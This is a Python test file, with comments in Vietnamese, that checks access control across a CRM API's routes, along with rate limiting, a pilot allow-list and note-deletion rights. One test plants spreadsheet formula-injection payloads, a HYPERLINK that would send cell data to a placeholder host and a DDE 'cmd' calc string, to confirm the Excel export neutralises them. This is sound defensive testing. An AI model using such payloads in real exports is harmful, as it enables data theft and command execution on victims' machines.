"""CRM Lite — kiểm tra phân quyền trên TOÀN BỘ route của router CRM (tự liệt kê route: thêm route mới mà quên kiểm quyền là test hỏng).

Với mỗi route:  chưa đăng nhập → 401 · hạng Thường → 403 · hạng Vàng của doanh nghiệp KHÁC → 404 (route có id)
hoặc không thấy dữ liệu của doanh nghiệp kia (route danh sách) · gửi chéo trang (Origin lạ) → 403.
"""

import re
from io import BytesIO

import pytest
from fastapi.routing import APIRoute
from fastapi.testclient import TestClient
from openpyxl import load_workbook

from app.ai import Reply
from app.config import get_settings
from app.routes import member_crm
from app.services import crm_ai
from tests.test_crm import board, gold_with_purchase
from tests.test_matching import other_member
from tests.test_member import ask, make_opp, member, pay_membership  # noqa: F401
from tests.test_tiers import topup


@pytest.fixture(autouse=True)
def gold_15m(monkeypatch):
    monkeypatch.setenv("LEADSCAN_GOLD_TOPUP_THRESHOLD", "15000000")
    monkeypatch.setenv("LEADSCAN_CRM_AI_ENABLED", "true")
    get_settings.cache_clear()
    monkeypatch.setattr(crm_ai, "call_model", lambda s, p: Reply("nháp", "cohere", "command-a-plus-05-2026", 10, 10))
    yield
    get_settings.cache_clear()


BODIES = {  # thân yêu cầu hợp lệ cho từng route ghi (để lỗi trả về chỉ có thể do phân quyền)
    ("PATCH", "/api/member/crm/leads/{lead_id}"): {"stage": "won"},
    ("POST", "/api/member/crm/leads/{lead_id}/notes"): {"content": "ghi chú"},
    ("POST", "/api/member/crm/leads/{lead_id}/tasks"): {"title": "việc"},
    ("PATCH", "/api/member/crm/tasks/{task_id}"): {"done": True},
    ("POST", "/api/member/crm/leads/{lead_id}/ai/draft"): {"channel": "email"},
}


def crm_routes() -> list[tuple[str, str]]:
    out = []
    for r in member_crm.router.routes:
        if isinstance(r, APIRoute):
            out += [(m, r.path) for m in sorted(r.methods)]
    return out


def test_router_co_du_route_da_biet():
    """Ai thêm route CRM mới thì phải thêm thân yêu cầu (nếu là route ghi) vào BODIES — buộc nghĩ tới phân quyền."""
    for method, path in crm_routes():
        if method in ("POST", "PATCH", "PUT") and "/ai/summary" not in path:
            assert (method, path) in BODIES, f"Route mới {method} {path}: thêm vào BODIES và kiểm tra phân quyền"


@pytest.fixture
def world(admin, member, client):
    """Doanh nghiệp A (Vàng, có lead + ghi chú + việc), B (Vàng, không có gì), C (Thường)."""
    gold_with_purchase(admin, member)
    lid = board(member)["leads"][0]["id"]
    nid = member.post(f"/api/member/crm/leads/{lid}/notes", json={"content": "bí mật của A"}).json()["note"]["id"]
    tid = member.post(f"/api/member/crm/leads/{lid}/tasks", json={"title": "việc của A"}).json()["id"]
    b = other_member(client, 2)
    ask(b)
    pay_membership(b)
    topup(b, 5_000_000)
    c = other_member(client, 3)
    pay_membership(c)
    return {"a": member, "b": b, "c": c, "ids": {"lead_id": lid, "note_id": nid, "task_id": tid}}


def call(cl: TestClient, method: str, path: str, ids: dict, **headers):
    url = re.sub(r"\{(\w+)\}", lambda m: str(ids[m.group(1)]), path)
    return cl.request(method, url, json=BODIES.get((method, path)), headers=headers or None)


def test_chua_dang_nhap_401(world):
    from app.main import app

    anon = TestClient(app)
    for method, path in crm_routes():
        assert call(anon, method, path, world["ids"]).status_code == 401, f"{method} {path}"


def test_hang_thuong_403(world):
    for method, path in crm_routes():
        r = call(world["c"], method, path, world["ids"])
        assert r.status_code == 403, f"{method} {path} → {r.status_code}"


def test_doanh_nghiep_khac_khong_cham_duoc(world):
    b, ids = world["b"], world["ids"]
    for method, path in crm_routes():
        r = call(b, method, path, ids)
        if "{" in path:
            assert r.status_code == 404, f"{method} {path} → {r.status_code}"
        else:  # route danh sách / xuất file: chạy được nhưng không lộ dữ liệu của A
            assert r.status_code == 200, f"{method} {path} → {r.status_code}"
            if path.endswith(".xlsx"):
                assert load_workbook(BytesIO(r.content)).active.max_row == 1
            else:
                assert "bí mật của A" not in r.text and "việc của A" not in r.text and "carton" not in r.text, path
    # sau tất cả các lần thử, dữ liệu của A còn nguyên
    d = world["a"].get(f"/api/member/crm/leads/{ids['lead_id']}").json()
    assert d["lead"]["stage"] == "new" and len(d["notes"]) == 1 and len(d["tasks"]) == 1 and d["ai"]["summary"] is None


def test_gui_cheo_trang_403(world):
    for method, path in crm_routes():
        if method == "GET":
            continue
        r = call(world["a"], method, path, world["ids"], origin="https://trang-la.example")
        assert r.status_code == 403, f"{method} {path} → {r.status_code}"


def test_excel_khong_chay_cong_thuc_tu_du_lieu(admin, member):
    """Tiêu đề / tên bên mua do đối tác nhập: chuỗi bắt đầu bằng = + - @ không được thành công thức khi mở file."""
    evil = '=HYPERLINK("https://x.example/?d="&A1,"Bấm vào")'
    gold_with_purchase(admin, member, title=evil, buyer_name="+cmd|' /C calc'!A0")
    ws = load_workbook(BytesIO(member.get("/api/member/crm/export.xlsx").content)).active
    title, buyer = ws.cell(2, 2), ws.cell(2, 3)
    assert title.data_type == "s" and title.value.endswith(evil)
    assert buyer.data_type == "s" and not str(buyer.value).startswith("+")


def test_ai_gioi_han_tan_suat(world, monkeypatch):
    """Bấm liên tục: tối đa CRM_AI_PER_MINUTE lượt / doanh nghiệp / phút (chặn bấm dồn vượt trần ngân sách)."""
    lid = world["ids"]["lead_id"]
    codes = [world["a"].post(f"/api/member/crm/leads/{lid}/ai/summary").status_code for _ in range(crm_ai.PER_MINUTE + 2)]
    assert codes[: crm_ai.PER_MINUTE] == [200] * crm_ai.PER_MINUTE and codes[-1] == 429


def test_chay_thu_chi_mo_cho_danh_sach(world, monkeypatch):
    """LEADSCAN_CRM_PILOT_CODES: chỉ khách trong danh sách vào được (dù cùng hạng Vàng); email nhắc việc cũng theo danh sách."""
    from app.db import new_session
    from app.services import crm_reminders

    a, b = world["a"], world["b"]
    code_b = b.get("/api/member/auth/me").json()["company"]["code"]
    monkeypatch.setenv("LEADSCAN_CRM_PILOT_CODES", f" {code_b.lower()} , LS-KHONG-CO ")
    get_settings.cache_clear()

    me_a = a.get("/api/member/auth/me").json()["company"]
    assert me_a["tier"]["key"] == "gold" and me_a["crm"]["access"] is False and "chạy thử" in me_a["crm"]["reason"]
    assert a.get("/api/member/crm/board").status_code == 403
    assert b.get("/api/member/auth/me").json()["company"]["crm"] == {"access": True, "reason": ""}
    assert b.get("/api/member/crm/board").status_code == 200
    a_lead = world["ids"]["lead_id"]
    monkeypatch.setattr("app.services.notify.send_mail", lambda *a_, **k: True)
    with new_session() as db:
        assert all(c.code == code_b for c in crm_reminders.gold_companies(db, get_settings()))
    assert b.get(f"/api/member/crm/leads/{a_lead}").status_code == 404

    monkeypatch.setenv("LEADSCAN_CRM_PILOT_CODES", "")  # bỏ chạy thử → mọi khách Vàng
    get_settings.cache_clear()
    assert a.get("/api/member/crm/board").status_code == 200


def test_chi_nguoi_viet_moi_xoa_duoc_ghi_chu(world, client):
    """Đồng nghiệp cùng doanh nghiệp xem được ghi chú nhưng không xoá được ghi chú của người khác."""
    from app.db import new_session
    from app.models import MemberUser
    from app.security import hash_password
    from tests.conftest import MEMBER_PW
    from tests.test_member import member_client

    with new_session() as db:
        a = db.query(MemberUser).filter_by(email="a@minhan.vn").one()
        db.add(MemberUser(company_id=a.company_id, email="dongnghiep@minhan.vn", full_name="Đồng Nghiệp", password_hash=hash_password(MEMBER_PW)))
        db.commit()
    mate = member_client("dongnghiep@minhan.vn")
    lid, nid = world["ids"]["lead_id"], world["ids"]["note_id"]
    assert len(mate.get(f"/api/member/crm/leads/{lid}").json()["notes"]) == 1
    assert mate.delete(f"/api/member/crm/notes/{nid}").status_code == 403
    # nhưng được giao việc / nhận lead
    me = mate.get("/api/member/auth/me").json()["id"]
    assert world["a"].patch(f"/api/member/crm/leads/{lid}", json={"owner_id": me}).json()["owner"]["id"] == me
